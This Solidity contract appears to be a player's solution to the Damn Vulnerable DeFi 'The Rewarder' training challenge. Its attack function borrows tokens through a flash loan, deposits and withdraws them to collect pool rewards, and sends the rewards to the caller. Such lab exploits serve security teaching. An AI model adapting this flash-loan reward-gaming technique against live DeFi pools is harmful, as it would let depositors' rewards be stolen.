// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../the-rewarder/TheRewarderPool.sol";
import "../DamnValuableToken.sol";
import "../the-rewarder/FlashLoanerPool.sol";
import "../the-rewarder/RewardToken.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title ReceiverTheReward
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract ReceiverTheReward{

    TheRewarderPool pool;
    DamnValuableToken public immutable liquidityToken;
    FlashLoanerPool flashLoanPool;
    RewardToken public rewardToken;

    constructor(address poolAddress,address _liquidityToken,address _flashLoanPool,address _rewardToken) {
        pool = TheRewarderPool(poolAddress);
        liquidityToken = DamnValuableToken(_liquidityToken);
        flashLoanPool = FlashLoanerPool(_flashLoanPool);
        rewardToken = RewardToken(_rewardToken);
    }


    function attack(uint256 amount)external {
        flashLoanPool.flashLoan(amount);
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }
    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(pool),amount);
        pool.deposit(amount);
        pool.withdraw(amount);
        liquidityToken.transfer(msg.sender,amount);
    }
}
